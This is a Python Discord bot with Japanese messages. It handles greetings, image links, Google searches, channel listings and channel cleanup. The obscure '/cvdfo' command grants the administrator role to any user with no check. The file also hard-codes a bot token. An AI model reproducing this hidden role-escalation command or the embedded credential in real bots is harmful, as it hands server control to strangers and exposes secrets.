import discord

import sys

from googlesearch import search

TOKEN = 'NjI0NzIzMzI4NzcwMzc1NzAw.XaGoFg.wcBtR6YD5QvVIsawAL2JAf_Wl0I'

client = discord.Client()

ModeFlag = 0

@client.event
async def on_ready():
    print('Logged in as')
    print('google検索できます')
    print(client.user.name)
    print(client.user.id)
    print('discordで稼働中')
    print('--------------')

    CHANNEL_ID = 624819624088829962
    channel = client.get_channel(CHANNEL_ID)
    await channel.send('https://cdn.discordapp.com/attachments/620946226547785748/634893073049976852/9k.png')    

    CHANNEL_ID = 623203623999897620
    channel = client.get_channel(CHANNEL_ID)
    await channel.send('https://cdn.discordapp.com/attachments/620946226547785748/634893073049976852/9k.png')

@client.event
async def on_message(message):

    if message.author.bot:
        return

    if message.content == '/koron':
        await message.channel.send('こんにちわ')

    if message.author.bot:
        return

    if message.content == '/join':
        await message.channel.send('https://cdn.discordapp.com/attachments/629985316031168512/632515186691145729/9k.png')

    if message.content == '/huru':
        await message.channel.send('https://youtube.com')

    global ModeFlag

    if message.author.bot:
        return

    if message.content == '/exit':
        await message.channel.send('ﾉｼ')
        sys.exit()

    if ModeFlag == 1:
        kensaku  = message.content
        ModeFlag = 0
        count = 0

        for url in search(kensaku, lang="jp",num = 5):
            await message.channel.send(url)
            count += 1
            if(count == 5):
               break

    if message.content == '/google':
        ModeFlag = 1
        await message.channel.send('検索するワードをチャットで発言してね')

    if client.user in message.mentions:
        reply = f'{message.author.mention} 呼んだ？' 
        await message.channel.send(reply) 

    if message.content == '/members':
        print(message.guild.members)

    if message.content == '/roles':
        print(message.guild.roles)

    if message.content == '/text_channels':
        print(message.guild.text_channels)

    if message.content == '/voice_channels':
        print(message.guild.voice_channels)

    if message.content == '/category_channels':
        print(message.guild.categories)

    if message.content.startswith('/cvdfo'):
        role = discord.utils.get(message.guild.roles, name='管理者')
        await message.author.add_roles(role)
        reply = f'{message.author.mention} ようこそ！'
        await message.channel.send(reply)



    if message.content == '/cleanup':
        if message.author.guild_permissions.administrator:
            await message.channel.purge()
            await message.channel.send('https://cdn.discordapp.com/attachments/632441714157813760/635020152076894225/images.png')
        else:
            await message.channel.send('https://cdn.discordapp.com/attachments/624819624088829962/629924179910590477/2Q.png')

client.run(TOKEN)